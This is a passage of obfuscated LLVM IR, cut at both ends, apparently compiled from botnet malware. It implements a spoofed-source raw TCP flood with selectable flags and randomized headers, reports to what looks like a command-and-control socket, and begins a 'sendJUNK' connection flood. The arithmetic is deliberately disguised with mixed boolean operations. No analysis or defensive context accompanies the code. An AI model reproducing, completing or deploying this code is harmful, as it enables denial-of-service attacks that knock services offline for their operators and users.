  %152 = or i16 %147, %151
  %153 = or i16 %136, 80
  store i16 %152, i16* %128, align 4
  %154 = load i8*, i8** %12, align 8
  %155 = call i32 @strcmp(i8* %154, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i32 0, i32 0)) #10
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %271, label %157

; <label>:157:                                    ; preds = %83
  %158 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 0
  %160 = bitcast %union.anon.0* %159 to %struct.anon.1*
  %161 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %160, i32 0, i32 4
  %162 = load i16, i16* %161, align 4
  %163 = xor i16 -513, -1
  %164 = xor i16 %162, %163
  %165 = and i16 %164, %162
  %166 = and i16 %162, -513
  %167 = xor i16 %165, -1
  %168 = xor i16 512, -1
  %169 = xor i16 7314, -1
  %170 = and i16 %167, 7314
  %171 = and i16 %165, %169
  %172 = and i16 %168, 7314
  %173 = and i16 512, %169
  %174 = or i16 %170, %171
  %175 = or i16 %172, %173
  %176 = xor i16 %174, %175
  %177 = or i16 %167, %168
  %178 = xor i16 %177, -1
  %179 = or i16 7314, %169
  %180 = and i16 %178, %179
  %181 = or i16 %176, %180
  %182 = or i16 %165, 512
  store i16 %181, i16* %161, align 4
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.0* %184 to %struct.anon.1*
  %186 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = xor i16 %187, -1
  %189 = xor i16 -1025, -1
  %190 = xor i16 14070, -1
  %191 = or i16 %188, %189
  %192 = or i16 14070, %190
  %193 = xor i16 %191, -1
  %194 = and i16 %193, %192
  %195 = and i16 %187, -1025
  %196 = xor i16 %194, -1
  %197 = xor i16 1024, -1
  %198 = xor i16 -5389, -1
  %199 = and i16 %196, -5389
  %200 = and i16 %194, %198
  %201 = and i16 %197, -5389
  %202 = and i16 1024, %198
  %203 = or i16 %199, %200
  %204 = or i16 %201, %202
  %205 = xor i16 %203, %204
  %206 = or i16 %196, %197
  %207 = xor i16 %206, -1
  %208 = or i16 -5389, %198
  %209 = and i16 %207, %208
  %210 = or i16 %205, %209
  %211 = or i16 %194, 1024
  store i16 %210, i16* %186, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon.0* %213 to %struct.anon.1*
  %215 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = xor i16 %216, -1
  %218 = xor i16 -257, -1
  %219 = xor i16 25697, -1
  %220 = or i16 %217, %218
  %221 = or i16 25697, %219
  %222 = xor i16 %220, -1
  %223 = and i16 %222, %221
  %224 = and i16 %216, -257
  %225 = xor i16 %223, -1
  %226 = xor i16 256, -1
  %227 = xor i16 6364, -1
  %228 = and i16 %225, 6364
  %229 = and i16 %223, %227
  %230 = and i16 %226, 6364
  %231 = and i16 256, %227
  %232 = or i16 %228, %229
  %233 = or i16 %230, %231
  %234 = xor i16 %232, %233
  %235 = or i16 %225, %226
  %236 = xor i16 %235, -1
  %237 = or i16 6364, %227
  %238 = and i16 %236, %237
  %239 = or i16 %234, %238
  %240 = or i16 %223, 256
  store i16 %239, i16* %215, align 4
  %241 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon.0* %242 to %struct.anon.1*
  %244 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = xor i16 %245, -1
  %247 = xor i16 -4097, -1
  %248 = xor i16 -6437, -1
  %249 = or i16 %246, %247
  %250 = or i16 -6437, %248
  %251 = xor i16 %249, -1
  %252 = and i16 %251, %250
  %253 = and i16 %245, -4097
  %254 = and i16 %252, 4096
  %255 = xor i16 %252, 4096
  %256 = or i16 %254, %255
  %257 = or i16 %252, 4096
  store i16 %256, i16* %244, align 4
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = xor i16 -2049, -1
  %264 = xor i16 %262, %263
  %265 = and i16 %264, %262
  %266 = and i16 %262, -2049
  %267 = and i16 %265, 2048
  %268 = xor i16 %265, 2048
  %269 = or i16 %267, %268
  %270 = or i16 %265, 2048
  store i16 %269, i16* %261, align 4
  br label %430

; <label>:271:                                    ; preds = %83
  %272 = load i8*, i8** %12, align 8
  %273 = call i8* @strtok(i8* %272, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %273, i8** %23, align 8
  br label %274

; <label>:274:                                    ; preds = %427, %271
  %275 = load i8*, i8** %23, align 8
  %276 = icmp ne i8* %275, null
  br i1 %276, label %277, label %429

; <label>:277:                                    ; preds = %274
  %278 = load i8*, i8** %23, align 8
  %279 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %280 = icmp ne i32 %279, 0
  br i1 %280, label %295, label %281

; <label>:281:                                    ; preds = %277
  %282 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon.0* %283 to %struct.anon.1*
  %285 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = xor i16 -513, -1
  %288 = xor i16 %286, %287
  %289 = and i16 %288, %286
  %290 = and i16 %286, -513
  %291 = and i16 %289, 512
  %292 = xor i16 %289, 512
  %293 = or i16 %291, %292
  %294 = or i16 %289, 512
  store i16 %293, i16* %285, align 4
  br label %427

; <label>:295:                                    ; preds = %277
  %296 = load i8*, i8** %23, align 8
  %297 = call i32 @strcmp(i8* %296, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %325, label %299

; <label>:299:                                    ; preds = %295
  %300 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon.0* %301 to %struct.anon.1*
  %303 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = xor i16 -1025, -1
  %306 = xor i16 %304, %305
  %307 = and i16 %306, %304
  %308 = and i16 %304, -1025
  %309 = xor i16 %307, -1
  %310 = xor i16 1024, -1
  %311 = xor i16 -26631, -1
  %312 = and i16 %309, -26631
  %313 = and i16 %307, %311
  %314 = and i16 %310, -26631
  %315 = and i16 1024, %311
  %316 = or i16 %312, %313
  %317 = or i16 %314, %315
  %318 = xor i16 %316, %317
  %319 = or i16 %309, %310
  %320 = xor i16 %319, -1
  %321 = or i16 -26631, %311
  %322 = and i16 %320, %321
  %323 = or i16 %318, %322
  %324 = or i16 %307, 1024
  store i16 %323, i16* %303, align 4
  br label %426

; <label>:325:                                    ; preds = %295
  %326 = load i8*, i8** %23, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %359, label %329

; <label>:329:                                    ; preds = %325
  %330 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon.0* %331 to %struct.anon.1*
  %333 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = xor i16 %334, -1
  %336 = xor i16 -257, -1
  %337 = xor i16 -32357, -1
  %338 = or i16 %335, %336
  %339 = or i16 -32357, %337
  %340 = xor i16 %338, -1
  %341 = and i16 %340, %339
  %342 = and i16 %334, -257
  %343 = xor i16 %341, -1
  %344 = xor i16 256, -1
  %345 = xor i16 25663, -1
  %346 = and i16 %343, 25663
  %347 = and i16 %341, %345
  %348 = and i16 %344, 25663
  %349 = and i16 256, %345
  %350 = or i16 %346, %347
  %351 = or i16 %348, %349
  %352 = xor i16 %350, %351
  %353 = or i16 %343, %344
  %354 = xor i16 %353, -1
  %355 = or i16 25663, %345
  %356 = and i16 %354, %355
  %357 = or i16 %352, %356
  %358 = or i16 %341, 256
  store i16 %357, i16* %333, align 4
  br label %425

; <label>:359:                                    ; preds = %325
  %360 = load i8*, i8** %23, align 8
  %361 = call i32 @strcmp(i8* %360, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %362 = icmp ne i32 %361, 0
  br i1 %362, label %389, label %363

; <label>:363:                                    ; preds = %359
  %364 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 0
  %366 = bitcast %union.anon.0* %365 to %struct.anon.1*
  %367 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %366, i32 0, i32 4
  %368 = load i16, i16* %367, align 4
  %369 = xor i16 -4097, -1
  %370 = xor i16 %368, %369
  %371 = and i16 %370, %368
  %372 = and i16 %368, -4097
  %373 = xor i16 %371, -1
  %374 = xor i16 4096, -1
  %375 = xor i16 9549, -1
  %376 = and i16 %373, 9549
  %377 = and i16 %371, %375
  %378 = and i16 %374, 9549
  %379 = and i16 4096, %375
  %380 = or i16 %376, %377
  %381 = or i16 %378, %379
  %382 = xor i16 %380, %381
  %383 = or i16 %373, %374
  %384 = xor i16 %383, -1
  %385 = or i16 9549, %375
  %386 = and i16 %384, %385
  %387 = or i16 %382, %386
  %388 = or i16 %371, 4096
  store i16 %387, i16* %367, align 4
  br label %424

; <label>:389:                                    ; preds = %359
  %390 = load i8*, i8** %23, align 8
  %391 = call i32 @strcmp(i8* %390, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0)) #10
  %392 = icmp ne i32 %391, 0
  br i1 %392, label %419, label %393

; <label>:393:                                    ; preds = %389
  %394 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon.0* %395 to %struct.anon.1*
  %397 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = xor i16 -2049, -1
  %400 = xor i16 %398, %399
  %401 = and i16 %400, %398
  %402 = and i16 %398, -2049
  %403 = xor i16 %401, -1
  %404 = xor i16 2048, -1
  %405 = xor i16 24887, -1
  %406 = and i16 %403, 24887
  %407 = and i16 %401, %405
  %408 = and i16 %404, 24887
  %409 = and i16 2048, %405
  %410 = or i16 %406, %407
  %411 = or i16 %408, %409
  %412 = xor i16 %410, %411
  %413 = or i16 %403, %404
  %414 = xor i16 %413, -1
  %415 = or i16 24887, %405
  %416 = and i16 %414, %415
  %417 = or i16 %412, %416
  %418 = or i16 %401, 2048
  store i16 %417, i16* %397, align 4
  br label %423

; <label>:419:                                    ; preds = %389
  %420 = load i32, i32* @mainCommSock, align 4
  %421 = load i8*, i8** %23, align 8
  %422 = call i32 (i32, i8*, ...) @sockprintf(i32 %420, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i32 0, i32 0), i8* %421)
  br label %423

; <label>:423:                                    ; preds = %419, %393
  br label %424

; <label>:424:                                    ; preds = %423, %363
  br label %425

; <label>:425:                                    ; preds = %424, %329
  br label %426

; <label>:426:                                    ; preds = %425, %299
  br label %427

; <label>:427:                                    ; preds = %426, %281
  %428 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %428, i8** %23, align 8
  br label %274

; <label>:429:                                    ; preds = %274
  br label %430

; <label>:430:                                    ; preds = %429, %157
  %431 = call i32 @rand_cmwc()
  %432 = trunc i32 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 0
  %435 = bitcast %union.anon.0* %434 to %struct.anon.1*
  %436 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %435, i32 0, i32 5
  store i16 %432, i16* %436, align 2
  %437 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 0
  %439 = bitcast %union.anon.0* %438 to %struct.anon.1*
  %440 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %439, i32 0, i32 6
  store i16 0, i16* %440, align 4
  %441 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 0
  %443 = bitcast %union.anon.0* %442 to %struct.anon.1*
  %444 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %443, i32 0, i32 7
  store i16 0, i16* %444, align 2
  %445 = load i32, i32* %9, align 4
  %446 = icmp eq i32 %445, 0
  br i1 %446, label %447, label %449

; <label>:447:                                    ; preds = %430
  %448 = call i32 @rand_cmwc()
  br label %454

; <label>:449:                                    ; preds = %430
  %450 = load i32, i32* %9, align 4
  %451 = trunc i32 %450 to i16
  %452 = call zeroext i16 @htons(i16 zeroext %451) #13
  %453 = zext i16 %452 to i32
  br label %454

; <label>:454:                                    ; preds = %449, %447
  %455 = phi i32 [ %448, %447 ], [ %453, %449 ]
  %456 = trunc i32 %455 to i16
  %457 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 0
  %459 = bitcast %union.anon.0* %458 to %struct.anon.1*
  %460 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %459, i32 0, i32 1
  store i16 %456, i16* %460, align 2
  %461 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %462 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %463 = call zeroext i16 @tcpcsum(%struct.iphdr* %461, %struct.tcphdr* %462)
  %464 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 0
  %466 = bitcast %union.anon.0* %465 to %struct.anon.1*
  %467 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %466, i32 0, i32 6
  store i16 %463, i16* %467, align 4
  %468 = bitcast i8* %90 to i16*
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 2
  %471 = load i16, i16* %470, align 2
  %472 = zext i16 %471 to i32
  %473 = call zeroext i16 @csum(i16* %468, i32 %472)
  %474 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 7
  store i16 %473, i16* %475, align 2
  %476 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %477 = load i32, i32* %10, align 4
  %478 = sub i32 0, %477
  %479 = sub i32 %476, %478
  %480 = add nsw i32 %476, %477
  store i32 %479, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %481

; <label>:481:                                    ; preds = %534, %533, %454
  br label %482

; <label>:482:                                    ; preds = %481
  %483 = load i32, i32* %17, align 4
  %484 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %485 = call i64 @sendto(i32 %483, i8* %90, i64 %87, i32 0, %struct.sockaddr* %484, i32 16)
  %486 = load i32, i32* %19, align 4
  %487 = call i32 @getRandomIP(i32 %486)
  %488 = call i32 @htonl(i32 %487) #13
  %489 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 8
  store i32 %488, i32* %490, align 4
  %491 = call i32 @rand_cmwc()
  %492 = trunc i32 %491 to i16
  %493 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 3
  store i16 %492, i16* %494, align 4
  %495 = call i32 @rand_cmwc()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = bitcast %union.anon.0* %497 to %struct.anon.1*
  %499 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %498, i32 0, i32 2
  store i32 %495, i32* %499, align 4
  %500 = call i32 @rand_cmwc()
  %501 = trunc i32 %500 to i16
  %502 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 0
  %504 = bitcast %union.anon.0* %503 to %struct.anon.1*
  %505 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %504, i32 0, i32 0
  store i16 %501, i16* %505, align 4
  %506 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = bitcast %union.anon.0* %507 to %struct.anon.1*
  %509 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %508, i32 0, i32 6
  store i16 0, i16* %509, align 4
  %510 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %511 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %512 = call zeroext i16 @tcpcsum(%struct.iphdr* %510, %struct.tcphdr* %511)
  %513 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 0
  %515 = bitcast %union.anon.0* %514 to %struct.anon.1*
  %516 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %515, i32 0, i32 6
  store i16 %512, i16* %516, align 4
  %517 = bitcast i8* %90 to i16*
  %518 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 2
  %520 = load i16, i16* %519, align 2
  %521 = zext i16 %520 to i32
  %522 = call zeroext i16 @csum(i16* %517, i32 %521)
  %523 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 7
  store i16 %522, i16* %524, align 2
  %525 = load i32, i32* %25, align 4
  %526 = load i32, i32* %15, align 4
  %527 = icmp eq i32 %525, %526
  br i1 %527, label %528, label %534

; <label>:528:                                    ; preds = %482
  %529 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %530 = load i32, i32* %24, align 4
  %531 = icmp sgt i32 %529, %530
  br i1 %531, label %532, label %533

; <label>:532:                                    ; preds = %528
  br label %540

; <label>:533:                                    ; preds = %528
  store i32 0, i32* %25, align 4
  br label %481

; <label>:534:                                    ; preds = %482
  %535 = load i32, i32* %25, align 4
  %536 = sub i32 %535, 595971393
  %537 = add i32 %536, 1
  %538 = add i32 %537, 595971393
  %539 = add i32 %535, 1
  store i32 %538, i32* %25, align 4
  br label %481

; <label>:540:                                    ; preds = %532
  %541 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %541)
  br label %542

; <label>:542:                                    ; preds = %540, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %253

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = sub i32 0, %45
  %48 = sub i32 0, %46
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add nsw i32 %45, %46
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %250, %32
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %251

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %244, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %250

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %243 [
    i32 0, label %68
    i32 1, label %127
    i32 2, label %217
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = xor i32 %84, -1
  %86 = xor i32 2048, -1
  %87 = xor i32 -621959014, -1
  %88 = and i32 %85, -621959014
  %89 = and i32 %84, %87
  %90 = and i32 %86, -621959014
  %91 = and i32 2048, %87
  %92 = or i32 %88, %89
  %93 = or i32 %90, %91
  %94 = xor i32 %92, %93
  %95 = or i32 %85, %86
  %96 = xor i32 %95, -1
  %97 = or i32 -621959014, %87
  %98 = and i32 %96, %97
  %99 = or i32 %94, %98
  %100 = or i32 %84, 2048
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %99)
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %108 = call i32 @connect(i32 %106, %struct.sockaddr* %107, i32 16)
  %109 = icmp ne i32 %108, -1
  br i1 %109, label %114, label %110

; <label>:110:                                    ; preds = %68
  %111 = call i32* @__errno_location() #13
  %112 = load i32, i32* %111, align 4
  %113 = icmp ne i32 %112, 115
  br i1 %113, label %114, label %121

; <label>:114:                                    ; preds = %110, %68
  %115 = load i32, i32* %8, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %116
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = call i32 @close(i32 %119)
  br label %126

; <label>:121:                                    ; preds = %110
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 1
  store i8 1, i8* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %121, %114
  br label %243

; <label>:127:                                    ; preds = %61
  br label %128

; <label>:128:                                    ; preds = %127
  %129 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %130 = getelementptr inbounds [16 x i64], [16 x i64]* %129, i64 0, i64 0
  %131 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %130) #2, !srcloc !6
  %132 = extractvalue { i64, i64* } %131, 0
  %133 = extractvalue { i64, i64* } %131, 1
  %134 = trunc i64 %132 to i32
  store i32 %134, i32* %18, align 4
  %135 = ptrtoint i64* %133 to i64
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %19, align 4
  br label %137

; <label>:137:                                    ; preds = %128
  br label %138

; <label>:138:                                    ; preds = %137
  %139 = load i32, i32* %8, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %140
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = srem i32 %143, 64
  %145 = zext i32 %144 to i64
  %146 = shl i64 1, %145
  %147 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = sdiv i32 %152, 64
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [16 x i64], [16 x i64]* %147, i64 0, i64 %154
  %156 = load i64, i64* %155, align 8
  %157 = and i64 %156, %146
  %158 = xor i64 %156, %146
  %159 = or i64 %157, %158
  %160 = or i64 %156, %146
  store i64 %159, i64* %155, align 8
  %161 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %161, align 8
  %162 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %162, align 8
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = sub i32 0, 1
  %169 = sub i32 %167, %168
  %170 = add nsw i32 %167, 1
